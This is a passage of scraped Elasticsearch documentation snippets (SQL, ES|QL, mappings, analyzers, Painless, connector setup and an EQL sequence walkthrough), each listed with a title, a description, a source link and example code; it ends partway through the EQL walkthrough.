https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/sql/sql-functions-aggs.md#2025-04-21_snippet_17\n\nLANGUAGE: sql\nCODE:\n```\n```sql\nSELECT MIN(salary / 12.0) AS min, MAX(salary / 12.0) AS max, STDDEV_SAMP(salary / 12.0) AS stddev FROM emp;\n\n       min        |       max       |     stddev\n------------------+-----------------+-----------------\n2110.3333333333335|6249.916666666667|1152.872638507562\n```\n```\n\n----------------------------------------\n\nTITLE: Filtering Data with QSTR Function in ESQL\nDESCRIPTION: This code snippet demonstrates how to use the QSTR function in ESQL to filter data based on a query string. It searches the 'books' index for entries where the 'author' field contains the value 'Faulkner'.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/kibana/docs/functions/qstr.md#2025-04-21_snippet_0\n\nLANGUAGE: esql\nCODE:\n```\nFROM books\n| WHERE QSTR(\"author: Faulkner\")\n```\n\n----------------------------------------\n\nTITLE: Configuring UAX URL Email Tokenizer with Custom Max Token Length\nDESCRIPTION: This example shows how to configure the UAX URL email tokenizer with a custom max_token_length of 5. It creates an index with a custom analyzer using this tokenizer configuration and then analyzes a sample email address.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/text-analysis/analysis-uaxurlemail-tokenizer.md#2025-04-21_snippet_1\n\nLANGUAGE: console\nCODE:\n```\nPUT my-index-000001\n{\n  \"settings\": {\n    \"analysis\": {\n      \"analyzer\": {\n        \"my_analyzer\": {\n          \"tokenizer\": \"my_tokenizer\"\n        }\n      },\n      \"tokenizer\": {\n        \"my_tokenizer\": {\n          \"type\": \"uax_url_email\",\n          \"max_token_length\": 5\n        }\n      }\n    }\n  }\n}\n\nPOST my-index-000001/_analyze\n{\n  \"analyzer\": \"my_analyzer\",\n  \"text\": \"john.smith@global-international.com\"\n}\n```\n\n----------------------------------------\n\nTITLE: SELECT Expression Without Alias\nDESCRIPTION: Example of a SELECT statement without an alias, where Elasticsearch SQL assigns a default name to the output column.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/sql/sql-syntax-select.md#2025-04-21_snippet_2\n\nLANGUAGE: sql\nCODE:\n```\nSELECT 1 + 1;\n```\n\n----------------------------------------\n\nTITLE: Indexing a LineString Shape in WKT Format\nDESCRIPTION: This example demonstrates indexing a linestring shape using Well-Known Text (WKT) format. The linestring is specified with a series of x,y coordinates in a string format.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/mapping-reference/shape.md#2025-04-21_snippet_4\n\nLANGUAGE: console\nCODE:\n```\nPOST /example/_doc\n{\n  \"location\" : \"LINESTRING (-377.03653 389.897676, -377.009051 389.889939)\"\n}\n```\n\n----------------------------------------\n\nTITLE: Painless Script for Watcher Condition\nDESCRIPTION: This Painless script is used as a condition in a Watcher to check if any theatre's monetary value is either below a low threshold or above a high threshold, both defined in the watch's metadata.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/scripting-languages/painless/painless-watcher-transform-context.md#2025-04-21_snippet_5\n\nLANGUAGE: painless\nCODE:\n```\n\n        return ctx.payload.aggregations.theatres.buckets.stream()\n          .anyMatch(theatre -> theatre.money.value < ctx.metadata.low_threshold ||\n                               theatre.money.value > ctx.metadata.high_threshold)\n      \n```\n\n----------------------------------------\n\nTITLE: Example of RLIKE Operator Usage in Elasticsearch SQL\nDESCRIPTION: Demonstrates how to use the RLIKE operator with a regular expression pattern. This example returns books whose names match the pattern 'Child.* Dune'.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/sql/sql-like-rlike-operators.md#2025-04-21_snippet_4\n\nLANGUAGE: sql\nCODE:\n```\nSELECT author, name FROM library WHERE name RLIKE 'Child.* Dune';\n\n    author     |      name\n---------------+----------------\nFrank Herbert  |Children of Dune\n```\n\n----------------------------------------\n\nTITLE: Converting from Milliseconds\nDESCRIPTION: Shows how to convert milliseconds since epoch to a ZonedDateTime object.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/scripting-languages/painless/using-datetime-in-painless.md#2025-04-21_snippet_6\n\nLANGUAGE: painless\nCODE:\n```\nlong milliSinceEpoch = 434931330000L;\nInstant instant = Instant.ofEpochMilli(milliSinceEpoch);\nZonedDateTime zdt = ZonedDateTime.ofInstant(instant, ZoneId.of('Z'));\n```\n\n----------------------------------------\n\nTITLE: Basic Search with Unified Highlighter\nDESCRIPTION: Performs a search across both the standard and English analyzed fields without using matched_fields, resulting in highlighting only exact matches in the standard analyzed field.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/rest-apis/highlighting.md#2025-04-21_snippet_11\n\nLANGUAGE: json\nCODE:\n```\nGET index1/_search\n{\n  \"query\": {\n    \"query_string\": {\n      \"query\": \"running with scissors\",\n      \"fields\": [\"comment\", \"comment.english\"]\n    }\n  },\n  \"highlight\": {\n    \"order\": \"score\",\n    \"fields\": {\n      \"comment\": {}\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Indexing Multiple Suggestions with Different Weights\nDESCRIPTION: Example showing how to index multiple suggestions for a single document, each with its own input value and weight. This allows for more complex suggestion configurations with differing priorities.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/rest-apis/search-suggesters.md#2025-04-21_snippet_10\n\nLANGUAGE: json\nCODE:\n```\nPUT music/_doc/1?refresh\n{\n  \"suggest\": [\n    {\n      \"input\": \"Nevermind\",\n      \"weight\": 10\n    },\n    {\n      \"input\": \"Nirvana\",\n      \"weight\": 3\n    }\n  ]\n}\n```\n\n----------------------------------------\n\nTITLE: Status Metric Example\nDESCRIPTION: This snippet illustrates the use of the 'status' suffix to represent enum-like gauges, with an example related to Elasticsearch's overall health.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/modules/apm/NAMING.md#2025-04-21_snippet_11\n\nLANGUAGE: none\nCODE:\n```\n\"es.health.overall.red.status\"\n```\n\n----------------------------------------\n\nTITLE: Date Time Function Documentation Links in Markdown\nDESCRIPTION: Markdown-formatted links to reference documentation for Elasticsearch SQL date and time functions. Each link points to specific anchors within the date-time-functions documentation page.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/lists/date-time-functions.md#2025-04-21_snippet_0\n\nLANGUAGE: markdown\nCODE:\n```\n* [`DATE_DIFF`](../../functions-operators/date-time-functions.md#esql-date_diff)\n* [`DATE_EXTRACT`](../../functions-operators/date-time-functions.md#esql-date_extract)\n* [`DATE_FORMAT`](../../functions-operators/date-time-functions.md#esql-date_format)\n* [`DATE_PARSE`](../../functions-operators/date-time-functions.md#esql-date_parse)\n* [`DATE_TRUNC`](../../functions-operators/date-time-functions.md#esql-date_trunc)\n* [`NOW`](../../functions-operators/date-time-functions.md#esql-now)\n```\n\n----------------------------------------\n\nTITLE: Repurposing Node as Coordinating-Only\nDESCRIPTION: Example of converting a data node to a coordinating-only node using the elasticsearch-node repurpose command. Shows the cleanup process after setting node.roles to empty array.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/command-line-tools/node-tool.md#2025-04-21_snippet_4\n\nLANGUAGE: txt\nCODE:\n```\nnode$./bin/elasticsearch-node repurpose\n\n    WARNING: Elasticsearch MUST be stopped before running this tool.\n\nFound 2 indices (2 shards and 2 index meta data) to clean up\nUse -v to see list of paths and indices affected\nNode is being re-purposed as no-master and no-data. Clean-up of index data will be performed.\nDo you want to proceed?\nConfirm [y/N] y\nNode successfully repurposed to no-master and no-data.\n```\n\n----------------------------------------\n\nTITLE: SKEWNESS Aggregation Function in SQL\nDESCRIPTION: Quantifies the asymmetric distribution of input values in a numeric field. Must be used directly on a field and cannot be used with scalar functions.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/sql/sql-functions-aggs.md#2025-04-21_snippet_13\n\nLANGUAGE: sql\nCODE:\n```\nSELECT MIN(salary) AS min, MAX(salary) AS max, SKEWNESS(salary) AS s FROM emp;\n```\n\n----------------------------------------\n\nTITLE: Finding Documents Missing Indexed Values with Not Exists - Console\nDESCRIPTION: This code snippet demonstrates using a combination of the 'must_not' boolean query and the 'exists' query in Elasticsearch to find documents that do not have an indexed value for the 'user.id' field. Dependencies include a running Elasticsearch instance and indices where the 'user.id' field is relevant.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/query-dsl/query-dsl-exists-query.md#2025-04-21_snippet_1\n\nLANGUAGE: console\nCODE:\n```\nGET /_search\n{\n  \"query\": {\n    \"bool\": {\n      \"must_not\": {\n        \"exists\": {\n          \"field\": \"user.id\"\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Creating Random Points for Elasticsearch Geo Testing in Java\nDESCRIPTION: This method generates a random point for geospatial testing in Elasticsearch. It uses randomDouble() to create latitude and longitude values within valid ranges.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/x-pack/plugin/esql/arrow/licenses/checker-qual-NOTICE.txt#2025-04-22_snippet_1\n\nLANGUAGE: Java\nCODE:\n```\npublic static Point randomPoint() {\n    return new Point(randomLongitude(), randomLatitude());\n}\n```\n\n----------------------------------------\n\nTITLE: Configuring Basic Inference Processor with Regression\nDESCRIPTION: Example configuration for regression inference processor with field mapping and results field specification.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/enrich-processor/inference-processor.md#2025-04-21_snippet_10\n\nLANGUAGE: json\nCODE:\n```\n\"inference\":{\n  \"model_id\": \"my_model_id\",\n  \"field_map\": {\n    \"original_fieldname\": \"expected_fieldname\"\n  },\n  \"inference_config\": {\n    \"regression\": {\n      \"results_field\": \"my_regression\"\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Translating SQL Count Functions to Elasticsearch JSON\nDESCRIPTION: This snippet shows how different SQL COUNT functions are translated into Elasticsearch aggregations. It includes examples of COUNT(*), COUNT(ALL *), and COUNT(DISTINCT).\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/x-pack/plugin/sql/src/test/resources/org/elasticsearch/xpack/sql/planner/querytranslator_tests.txt#2025-04-21_snippet_3\n\nLANGUAGE: sql\nCODE:\n```\nSELECT COUNT(DISTINCT keyword) dkey, COUNT(keyword) key FROM test;\n```\n\nLANGUAGE: json\nCODE:\n```\nREGEX ^\\{\"size\":0,.*\"aggregations\":\\{\"[a-zA-Z0-9]+\":\\{\"cardinality\":\\{\"field\":\"keyword\"\\}\\},\"[a-zA-Z0-9]+\":\\{\"filter\":\\{\"exists\":\\{\"field\":\"keyword\",\"boost\":1.0\\}\\}\\}\\}\\}$\n```\n\n----------------------------------------\n\nTITLE: Calculating Cube Root using CBRT Function in ESQL\nDESCRIPTION: Demonstrates how to calculate the cube root of a numeric value using the CBRT function. The function accepts any numeric input and returns a double value representing the cube root. Returns null for infinite values.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/kibana/docs/functions/cbrt.md#2025-04-21_snippet_0\n\nLANGUAGE: esql\nCODE:\n```\nROW d = 1000.0\n| EVAL c = CBRT(d)\n```\n\n----------------------------------------\n\nTITLE: Declaring and Using a Function in Painless\nDESCRIPTION: Example showing how to declare a boolean function named 'isNegative' that checks if a value is negative, and then using that function in a conditional statement. The function takes a dynamic typed parameter 'x' and returns true if x is less than 0.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/scripting-languages/painless/painless-functions.md#2025-04-21_snippet_0\n\nLANGUAGE: painless\nCODE:\n```\nboolean isNegative(def x) { x < 0 }\n...\nif (isNegative(someVar)) {\n  ...\n}\n```\n\n----------------------------------------\n\nTITLE: Show the value of a setting from Elasticsearch Keystore\nDESCRIPTION: Retrieves and displays the value of a specific secure setting. When settings contain binary data, use the `-o` option to write output to a file.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/command-line-tools/elasticsearch-keystore.md#_snippet_6\n\nLANGUAGE: Shell\nCODE:\n```\nbin/elasticsearch-keystore show the.name.of.the.setting.to.show\n```\n\n----------------------------------------\n\nTITLE: Pattern Matching Type Support Matrix\nDESCRIPTION: A markdown table showing supported data type combinations for pattern matching operations. Shows that both keyword and text type fields can be matched against keyword patterns, producing boolean results.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/operators/types/not rlike.md#2025-04-21_snippet_0\n\nLANGUAGE: markdown\nCODE:\n```\n| str | pattern | result |\n| --- | --- | --- |\n| keyword | keyword | boolean |\n| text | keyword | boolean |\n```\n\n----------------------------------------\n\nTITLE: Enabling SMTP STARTTLS in Elasticsearch YAML\nDESCRIPTION: Enables the STARTTLS command to switch to a TLS-protected connection. Requires proper trust store configuration.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/configuration-reference/watcher-settings.md#2025-04-21_snippet_14\n\nLANGUAGE: yaml\nCODE:\n```\nsmtp.starttls.enable\n```\n\n----------------------------------------\n\nTITLE: Using a String 'Now' Parameter in Painless Scripts\nDESCRIPTION: JSON configuration for passing the current time as a string parameter in ISO-8601 format to a Painless script. This approach requires parsing in the script.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/scripting-languages/painless/using-datetime-in-painless.md#2025-04-21_snippet_25\n\nLANGUAGE: JSON\nCODE:\n```\n...\n\"script\": {\n    ...\n    \"params\": {\n        \"now\": \"<generated string datetime in ISO-8601>\"\n    }\n}\n...\n```\n\n----------------------------------------\n\nTITLE: Sorting and Deduplication in Synthetic _source for Flattened Fields\nDESCRIPTION: This example demonstrates how synthetic _source sorts and deduplicates values in a flattened field. It creates an index with synthetic _source enabled and inserts a document with duplicate and unsorted values.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/mapping-reference/flattened.md#2025-04-21_snippet_5\n\nLANGUAGE: console\nCODE:\n```\nPUT idx\n{\n  \"settings\": {\n    \"index\": {\n      \"mapping\": {\n        \"source\": {\n          \"mode\": \"synthetic\"\n        }\n      }\n    }\n  },\n  \"mappings\": {\n    \"properties\": {\n      \"flattened\": { \"type\": \"flattened\" }\n    }\n  }\n}\nPUT idx/_doc/1\n{\n  \"flattened\": {\n    \"field\": [ \"apple\", \"apple\", \"banana\", \"avocado\", \"10\", \"200\", \"AVOCADO\", \"Banana\", \"Tangerine\" ]\n  }\n}\n```\n\nLANGUAGE: console-result\nCODE:\n```\n{\n  \"flattened\": {\n    \"field\": [ \"10\", \"200\", \"AVOCADO\", \"Banana\", \"Tangerine\", \"apple\", \"avocado\", \"banana\" ]\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Setting Allowed Stored Metric Scripts\nDESCRIPTION: Dynamic setting that specifies list of allowed stored script IDs for scripted metrics aggregations. Empty by default.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/configuration-reference/search-settings.md#2025-04-21_snippet_4\n\nLANGUAGE: properties\nCODE:\n```\nsearch.aggs.allowed_stored_metric_scripts\n```\n\n----------------------------------------\n\nTITLE: Configuring Elasticsearch Connector\nDESCRIPTION: Sample YAML configuration for setting up the MySQL connector with Elasticsearch and Kibana using Docker. Important fields include elasticsearch.host, elasticsearch.api_key, and connectors list. The elasticsearch.api_key is preferred for authentication.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/search-connectors/es-connectors-mysql.md#2025-04-21_snippet_4\n\nLANGUAGE: yaml\nCODE:\n```\n# When connecting to your cloud deployment you should edit the host value\nelasticsearch.host: http://host.docker.internal:9200\nelasticsearch.api_key: <ELASTICSEARCH_API_KEY>\n\nconnectors:\n  -\n    connector_id: <CONNECTOR_ID_FROM_KIBANA>\n    service_type: mysql\n    api_key: <CONNECTOR_API_KEY_FROM_KIBANA> # Optional. If not provided, the connector will use the elasticsearch.api_key instead\n```\n\n----------------------------------------\n\nTITLE: Configuring History Retention Settings in Elasticsearch YAML\nDESCRIPTION: Configuration settings for controlling soft deletes and retention lease periods in Elasticsearch indices. These settings determine how long operation history is preserved for replica recovery and cross-cluster replication.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/index-settings/history-retention.md#2025-04-21_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\nindex.soft_deletes.enabled: true\nindex.soft_deletes.retention_lease.period: \"12h\"\n```\n\n----------------------------------------\n\nTITLE: Template-Based Rank Evaluation Request\nDESCRIPTION: Shows how to use query templates in rank evaluation requests to make them more succinct.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/rest-apis/search-rank-eval.md#2025-04-21_snippet_2\n\nLANGUAGE: console\nCODE:\n```\nGET /my-index-000001/_rank_eval\n{\n   [...]\n  \"templates\": [\n     {\n        \"id\": \"match_one_field_query\",  \n        \"template\": { \n            \"inline\": {\n                \"query\": {\n                  \"match\": { \"{{field}}\": { \"query\": \"{{query_string}}\" }}\n                }\n            }\n        }\n     }\n  ],\n  \"requests\": [\n      {\n         \"id\": \"amsterdam_query\",\n         \"ratings\": [ ... ],\n         \"template_id\": \"match_one_field_query\", \n         \"params\": { \n            \"query_string\": \"amsterdam\",\n            \"field\": \"text\"\n          }\n     },\n    [...]\n  ]\n}\n```\n\n----------------------------------------\n\nTITLE: ESQL Count Function Description Comment\nDESCRIPTION: Documentation comment describing the count function's purpose of converting multivalued expressions into a single count value.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/description/mv_count.md#2025-04-21_snippet_0\n\nLANGUAGE: markdown\nCODE:\n```\n% This is generated by ESQL's AbstractFunctionTestCase. Do no edit it. See ../README.md for how to regenerate it.\n\n**Description**\n\nConverts a multivalued expression into a single valued column containing a count of the number of values.\n```\n\n----------------------------------------\n\nTITLE: Function Parameters Documentation in Markdown\nDESCRIPTION: Documents the required field parameter and optional precision parameter for the HyperLogLog count distinct function. Includes parameter descriptions and constraints like the maximum precision threshold of 40000.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/parameters/count_distinct.md#2025-04-21_snippet_0\n\nLANGUAGE: markdown\nCODE:\n```\n% This is generated by ESQL's AbstractFunctionTestCase. Do no edit it. See ../README.md for how to regenerate it.\n\n**Parameters**\n\n`field`\n:   Column or literal for which to count the number of distinct values.\n\n`precision`\n:   Precision threshold. Refer to [`AGG-COUNT-DISTINCT-APPROXIMATE`](/reference/query-languages/esql/functions-operators/aggregation-functions.md#esql-agg-count-distinct-approximate). The maximum supported value is 40000. Thresholds above this number will have the same effect as a threshold of 40000. The default value is 3000.\n```\n\n----------------------------------------\n\nTITLE: Running Zoom Connector Docker Container\nDESCRIPTION: Docker command to run the Elastic connectors service container with the configured settings for the Zoom connector.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/search-connectors/es-connectors-zoom.md#2025-04-22_snippet_5\n\nLANGUAGE: bash\nCODE:\n```\ndocker run \\\n-v ~/connectors-config:/config \\\n--network \"elastic\" \\\n--tty \\\n--rm \\\ndocker.elastic.co/integrations/elastic-connectors:9.0.0 \\\n/app/bin/elastic-ingest \\\n-c /config/config.yml\n```\n\n----------------------------------------\n\nTITLE: Indexing Answer Documents with Parent Reference\nDESCRIPTION: Creates child documents of type \"answer\" that reference the parent question document, including routing parameter to ensure they're stored in the same shard as the parent.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-bucket-parent-aggregation.md#2025-04-21_snippet_2\n\nLANGUAGE: console\nCODE:\n```\nPUT parent_example/_doc/2?routing=1\n{\n  \"join\": {\n    \"name\": \"answer\",\n    \"parent\": \"1\"\n  },\n  \"owner\": {\n    \"location\": \"Norfolk, United Kingdom\",\n    \"display_name\": \"Sam\",\n    \"id\": 48\n  },\n  \"body\": \"<p>Unfortunately you're pretty much limited to FTP...\",\n  \"creation_date\": \"2009-05-04T13:45:37.030\"\n}\n\nPUT parent_example/_doc/3?routing=1&refresh\n{\n  \"join\": {\n    \"name\": \"answer\",\n    \"parent\": \"1\"\n  },\n  \"owner\": {\n    \"location\": \"Norfolk, United Kingdom\",\n    \"display_name\": \"Troll\",\n    \"id\": 49\n  },\n  \"body\": \"<p>Use Linux...\",\n  \"creation_date\": \"2009-05-05T13:45:37.030\"\n}\n```\n\n----------------------------------------\n\nTITLE: Running external commands using Shell in Java\nDESCRIPTION: This snippet demonstrates how to use the `Shell` class to run external commands in bash or PowerShell. It shows how to execute commands using the `bash` and `powershell` methods, which handle the appropriate command-line syntax.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/qa/packaging/README.md#2025-04-21_snippet_3\n\nLANGUAGE: java\nCODE:\n```\n```java\nShell sh = new Shell();\n\n// equivalent to `bash -c 'echo $foo; echo $bar'`\nsh.bash(\"echo $foo; echo $bar\");\n\n// equivalent to `powershell.exe -Command 'Write-Host $foo; Write-Host $bar'`\nsh.powershell(\"Write-Host $foo; Write-Host $bar\");\n```\n```\n\n----------------------------------------\n\nTITLE: Analyzing Text with Edge N-gram Filter\nDESCRIPTION: Example of using the analyze API with edge_ngram filter to convert text into 1-character and 2-character edge n-grams at the beginning of each token.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/text-analysis/analysis-edgengram-tokenfilter.md#2025-04-21_snippet_0\n\nLANGUAGE: console\nCODE:\n```\nGET _analyze\n{\n  \"tokenizer\": \"standard\",\n  \"filter\": [\n    { \"type\": \"edge_ngram\",\n      \"min_gram\": 1,\n      \"max_gram\": 2\n    }\n  ],\n  \"text\": \"the quick brown fox jumps\"\n}\n```\n\n----------------------------------------\n\nTITLE: Updating extension name using local file method in Elasticsearch Service\nDESCRIPTION: API call to update the name of an existing extension created with the local file method. Only updates metadata without requiring the file to be re-uploaded.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch-plugins/cloud/ec-plugins-guide.md#2025-04-21_snippet_12\n\nLANGUAGE: sh\nCODE:\n```\ncurl -X POST \\\n  https://api.elastic-cloud.com/api/v1/deployments/extensions/EXTENSION_ID \\\n  -H \"Authorization: ApiKey $CLOUD_API_KEY\" \\\n  -H 'Content-Type: application/json' \\\n  -d '{\n   \"extension_type\" : \"plugin\",\n    \"name\": \"custom-plugin-07012020\",\n   \"version\" : \"8.4.3\"\n}'\n```\n\n----------------------------------------\n\nTITLE: Defining IllegalArgumentException in Java\nDESCRIPTION: This snippet defines the java.lang.IllegalArgumentException class, thrown to indicate that a method has been passed an illegal or inappropriate argument. It includes a default constructor and a constructor that accepts a string message.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/modules/lang-painless/src/main/resources/org/elasticsearch/painless/java.lang.txt#2025-04-21_snippet_35\n\nLANGUAGE: java\nCODE:\n```\nclass java.lang.IllegalArgumentException {\n  ()\n  (String)\n}\n```\n\n----------------------------------------\n\nTITLE: Including TO_STRING Function Documentation Sections in Markdown\nDESCRIPTION: This snippet demonstrates the structure of the documentation, including various sections of the TO_STRING function documentation using Markdown include directives.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/layout/to_string.md#2025-04-21_snippet_0\n\nLANGUAGE: markdown\nCODE:\n```\n% This is generated by ESQL's AbstractFunctionTestCase. Do no edit it. See ../README.md for how to regenerate it.\n\n## `TO_STRING` [esql-to_string]\n\n**Syntax**\n\n:::{image} ../../../images/functions/to_string.svg\n:alt: Embedded\n:class: text-center\n:::\n\n\n:::{include} ../parameters/to_string.md\n:::\n\n:::{include} ../description/to_string.md\n:::\n\n:::{include} ../types/to_string.md\n:::\n\n:::{include} ../examples/to_string.md\n:::\n```\n\n----------------------------------------\n\nTITLE: Advanced Jira Sync Rules - Priority and Project Filtering\nDESCRIPTION: JSON configuration to filter Jira issues by priority level across specific projects. This targets high-priority issues (Blocker, Critical) within selected projects.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/search-connectors/es-connectors-jira.md#2025-04-21_snippet_1\n\nLANGUAGE: js\nCODE:\n```\n[\n  {\n    \"query\": \"priority in (Blocker, Critical) AND project in (ProjA, ProjB, ProjC)\"\n  }\n]\n```\n\n----------------------------------------\n\nTITLE: HISTOGRAM Example with Numeric Fields in Elasticsearch SQL\nDESCRIPTION: Demonstrates using the HISTOGRAM function with numeric salary data, grouping salaries into 5000-unit buckets.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/sql/sql-functions-grouping.md#2025-04-21_snippet_2\n\nLANGUAGE: sql\nCODE:\n```\nSELECT HISTOGRAM(salary, 5000) AS h FROM emp GROUP BY h;\n\n       h\n---------------\n25000\n30000\n35000\n40000\n45000\n50000\n55000\n60000\n65000\n70000\n```\n\n----------------------------------------\n\nTITLE: MongoDB Aggregation Pipeline for Filtering\nDESCRIPTION: This snippet demonstrates the MongoDB aggregation pipeline used to filter apartments based on their location, specifically for those in Portugal or Spain. It employs the $match operator with an $or condition to ensure the criteria are met.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/search-connectors/es-sync-rules.md#2025-04-21_snippet_2\n\nLANGUAGE: JavaScript\nCODE:\n```\n[\n  {\n    \"$match\": {\n         \"$or\": [\n                {\n                  \"address.country_information.country\": \"Portugal\"\n                },\n                {\n                  \"address.country_information.country\": \"Spain\"\n                }\n              ]\n            }\n  }\n]\n```\n\n----------------------------------------\n\nTITLE: Grouping Geo-Line Data with Time-Series Aggregation in Elasticsearch\nDESCRIPTION: Example of using time-series aggregation to group geo-line data, specifically designed for time series indices. This approach leverages pre-sorted data by timestamp for better performance.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-metrics-geo-line.md#2025-04-21_snippet_5\n\nLANGUAGE: console\nCODE:\n```\nPOST /tour/_search?filter_path=aggregations\n{\n  \"aggregations\": {\n    \"path\": {\n      \"time_series\": {},\n      \"aggregations\": {\n        \"museum_tour\": {\n          \"geo_line\": {\n            \"point\": {\"field\": \"location\"}\n          }\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Correct MongoDB Aggregation Pipeline Example\nDESCRIPTION: This code snippet shows the correct way to use the current date in a MongoDB aggregation pipeline using aggregation variables.  It uses `$$NOW` to represent the current date, ensuring that the date is properly evaluated by MongoDB. An `$addFields` stage is used to create a `current_date` field, and `$expr` allows comparing fields.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/search-connectors/es-connectors-mongodb.md#2025-04-21_snippet_3\n\nLANGUAGE: js\nCODE:\n```\n{\n  \"aggregate\": {\n    \"pipeline\": [\n      {\n        \"$addFields\": {\n          \"current_date\": {\n            \"$toDate\": \"$$NOW\"\n          }\n        }\n      },\n      {\n        \"$match\": {\n          \"$expr\": {\n            \"$gte\": [\n              \"$expiresAt\",\n              \"$current_date\"\n            ]\n          }\n        }\n      }\n    ]\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Step-by-Step State Machine Transition Explanation for EQL Sequence Query\nDESCRIPTION: A detailed walkthrough of how the state machine processes each event in the dataset. Shows how sequences progress through different states based on the EQL query criteria and how separate state machines are maintained for each unique user.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/eql/eql-syntax.md#2025-04-21_snippet_39\n\nLANGUAGE: txt\nCODE:\n```\n{ \"index\" : { \"_id\": \"1\" } }\n{ \"user\": { \"name\": \"root\" }, \"process\": { \"name\": \"attrib\" }, ...}\n// Creates sequence [1] in state A for the \"root\" user.\n//\n// +------------------------\"root\"------------------------+\n// |  +-----------+     +-----------+     +------------+  |\n// |  |  State A  |     |  State B  |     |  Complete  |  |\n// |  +-----------+     +-----------+     +------------+  |\n// |  |    [1]    |     |           |     |            |  |\n// |  +-----------+     +-----------+     +------------+  |\n// +------------------------------------------------------+\n\n{ \"index\" : { \"_id\": \"2\" } }\n{ \"user\": { \"name\": \"root\" }, \"process\": { \"name\": \"attrib\" }, ...}\n// Creates sequence [2] in state A for \"root\", overwriting sequence [1].\n//\n// +------------------------\"root\"------------------------+\n// |  +-----------+     +-----------+     +------------+  |\n// |  |  State A  |     |  State B  |     |  Complete  |  |\n// |  +-----------+     +-----------+     +------------+  |\n// |  |    [2]    |     |           |     |            |  |\n// |  +-----------+     +-----------+     +------------+  |\n// +------------------------------------------------------+\n\n{ \"index\" : { \"_id\": \"3\" } }\n{ \"user\": { \"name\": \"elkbee\" }, \"process\": { \"name\": \"bash\" }, ...}\n// Nothing happens. The \"elkbee\" user has no pending sequence to move\n// from state A to state B.\n//\n// +-----------------------\"elkbee\"-----------------------+\n// |  +-----------+     +-----------+     +------------+  |\n// |  |  State A  |     |  State B  |     |  Complete  |  |\n// |  +-----------+     +-----------+     +------------+  |\n// |  |           |     |           |     |            |  |\n// |  +-----------+     +-----------+     +------------+  |\n// +------------------------------------------------------+\n\n{ \"index\" : { \"_id\": \"4\" } }\n{ \"user\": { \"name\": \"root\" }, \"process\": { \"name\": \"bash\" }, ...}\n// Sequence [2] moves out of state A for \"root\".\n// State B for \"root\" now contains [2, 4].\n// State A for \"root\" is empty.\n//\n// +------------------------\"root\"------------------------+\n// |  +-----------+     +-----------+     +------------+  |\n// |  |  State A  |     |  State B  |     |  Complete  |  |\n// |  +-----------+ --> +-----------+     +------------+  |\n// |  |           |     |   [2, 4]  |     |            |  |\n// |  +-----------+     +-----------+     +------------+  |\n// +------------------------------------------------------+\n\n{ \"index\" : { \"_id\": \"5\" } }\n{ \"user\": { \"name\": \"root\" }, \"process\": { \"name\": \"bash\" }, ...}\n// Nothing happens. State A is empty for \"root\".\n//\n// +------------------------\"root\"------------------------+\n// |  +-----------+     +-----------+     +------------+  |\n// |  |  State A  |     |  State B  |     |  Complete  |  